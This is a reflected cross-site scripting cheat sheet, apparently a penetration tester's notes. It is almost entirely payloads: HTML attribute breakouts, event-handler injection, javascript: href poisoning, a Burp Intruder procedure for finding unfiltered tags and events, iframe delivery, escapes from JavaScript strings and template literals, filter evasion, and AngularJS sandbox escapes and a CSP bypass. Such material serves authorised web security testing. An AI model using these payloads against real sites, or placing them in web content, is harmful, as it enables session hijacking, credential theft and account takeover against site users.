# Reflected

## Context

### AccessKey Attribute

Set a global accessKey parameter. When the user presses the selected key, a script will be executed. Works only on Chrome

```
<url>/?%27accesskey=%27<key>%27onclick=%27alert(1)
```

### HTML Parameter

```
"><script>...</script>
"><svg onload="...">
"><img src=. onerror="...">

//in case brackets are escaped, give onfocus event and focus on self
" autofocus onfocus="..." x="
" onmouseover="..." x="
```

Anchor href parameter poisoning

```
href="javascript:'...'"
```

### HTML Tags

1. Find vulnerable field
2. Send request to Burp Intruder as following `<§[payload]§>` to find unfiltered tags
3. Set the payload to a list of tags (see [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) and start the attack
4. After finding an unfiltered tag set the payload to `<[tag]+§[payload]§="alert()">`
5. Set the payload to a list of events (see [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) and start the attack
6. After finding a suitable event the basic payload will be`<[tag]+[event]="[js]">`

Deliver through IFrame

```
<iframe src="<url>" onload="...">
```

Deliver with custom tag with autofocus

```
<script>
location = "<url>/?search=<xss id='x' onfocus='...' tabindex=1>#x";
</script>
```

### Javascript Block

Escape from string such as `var x = 'input'`

```
</script><script>...</script>
```

Escape from strings with angled brackets encoded

```
'-<payload>-'
';<payload>//
```

Evade filters

```
\';<...>//                    //double quote filter
onerror=<func>;throw <arg>    //assign to error event.
&apos;-<...>-&apos;           //HTML escaped quotes
```

### JS Template Literals

JS template strings are declared between backticks and use `${...}` notation to evaluate code and inject the result in the string.

```
`Welcome, ${user.displayName}.`;
```

To execute code simply inject `${<...>}` in the string

### AngularJS Sandbox Escape

Sandbox escape by owerwriting the charAt method to join characters instead of evaluoating them one at a time

```
toString().constructor.prototype.charAt%3d[].join;
```

Code execution payloads

```
$eval('x=<...>')
[1]|orderBy:toString().constructor.fromCharCode(120 61 <charcode payload>)=1  //120 61 is for 'x='
```

Content Security Policy Bypass

```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],<...>)'">
```



&#x20;
